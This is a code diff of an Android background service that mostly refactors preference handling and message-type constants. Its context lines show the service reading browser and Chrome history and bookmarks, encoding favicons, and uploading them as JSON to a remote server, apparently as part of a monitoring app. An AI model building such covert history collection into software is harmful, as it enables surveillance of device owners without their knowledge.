@@ -23,6 +23,7 @@ import android.preference.PreferenceManager;
 import android.provider.Browser;
 import android.util.Base64;
 
+import com.inet.android.request.ConstantRequest;
 import com.inet.android.request.RequestList;
 import com.inet.android.utils.Logging;
 import com.inet.android.utils.WorkTimeDefiner;
@@ -36,15 +37,14 @@ import com.inet.android.utils.WorkTimeDefiner;
 public class LinkService extends Service {
 
 	private static final int SERVICE_REQUEST_CODE = 25; // service unique int
-	final String LOG_TAG = LinkService.class.getSimpleName().toString();
-	private SharedPreferences sPref;
-	final String SAVED_TIME = "saved_time";
+	private final String LOG_TAG = LinkService.class.getSimpleName().toString();
+	private final String SAVED_TIME = "saved_time";
 	private Context context;
 	private SharedPreferences sp;
 
 	public void onCreate() {
 		super.onCreate();
-//		startService(new Intent(this, LinkService.class));
+		// startService(new Intent(this, LinkService.class));
 
 		Logging.doLog(LOG_TAG, "onCreate", "onCreate");
 
@@ -112,7 +112,7 @@ public class LinkService extends Service {
 
 	@SuppressLint("SimpleDateFormat")
 	void linkTask() throws JSONException {
-	
+
 		String[] proj = new String[] { Browser.BookmarkColumns._ID,
 				Browser.BookmarkColumns.TITLE, Browser.BookmarkColumns.URL,
 				Browser.BookmarkColumns.VISITS, Browser.BookmarkColumns.DATE,
@@ -124,8 +124,6 @@ public class LinkService extends Service {
 		Cursor mCur = getContentResolver().query(Browser.BOOKMARKS_URI, proj,
 				sel, null, null);
 		mCur.moveToFirst();
-
-		sPref = PreferenceManager.getDefaultSharedPreferences(context);
 
 		String urlDate = "", url = "", title = "";
 
@@ -139,7 +137,7 @@ public class LinkService extends Service {
 				DateFormat formatter = new SimpleDateFormat(
 						"yyyy-MM-dd HH:mm:ss");
 
-				String savedTime = sPref.getString(SAVED_TIME, "");
+				String savedTime = sp.getString(SAVED_TIME, "");
 
 				Calendar calendar = Calendar.getInstance();
 				calendar.setTimeInMillis(Long.parseLong(savedTime));
@@ -173,8 +171,7 @@ public class LinkService extends Service {
 						if (favicon != null) {
 							encodedImage = Base64.encodeToString(favicon,
 									Base64.DEFAULT);
-							Logging.doLog(LOG_TAG, "image",
-									"image");
+							Logging.doLog(LOG_TAG, "image", "image");
 							info.put("icon", encodedImage);
 							favicon = null;
 
@@ -201,7 +198,7 @@ public class LinkService extends Service {
 					}
 					RequestList.sendDataRequest(object.toString(), this);
 
-					Editor ed = sPref.edit();
+					Editor ed = sp.edit();
 					ed.putString(SAVED_TIME, urlDate);
 					ed.commit();
 
@@ -242,7 +239,7 @@ public class LinkService extends Service {
 					DateFormat formatter = new SimpleDateFormat(
 							"yyyy-MM-dd HH:mm:ss");
 
-					String savedTime = sPref.getString(SAVED_TIME, "");
+					String savedTime = sp.getString(SAVED_TIME, "");
 
 					Calendar calendar = Calendar.getInstance();
 					calendar.setTimeInMillis(Long.parseLong(savedTime));
@@ -289,7 +286,7 @@ public class LinkService extends Service {
 							info.put("name", chromeTitle);
 
 							object.put("time", urlDateInFormat);
-							object.put("type", "7");
+							object.put("type", ConstantRequest.TYPE_HISTORY_BROUSER_REQUEST);
 							object.put("info", info);
 						} catch (JSONException e) {
 							Logging.doLog(LOG_TAG, "json сломался",
@@ -298,7 +295,7 @@ public class LinkService extends Service {
 
 						RequestList.sendDataRequest(object.toString(), this);
 
-						Editor ed = sPref.edit();
+						Editor ed = sp.edit();
 						ed.putString(SAVED_TIME, chromeUrlDate);
 						ed.commit();
 
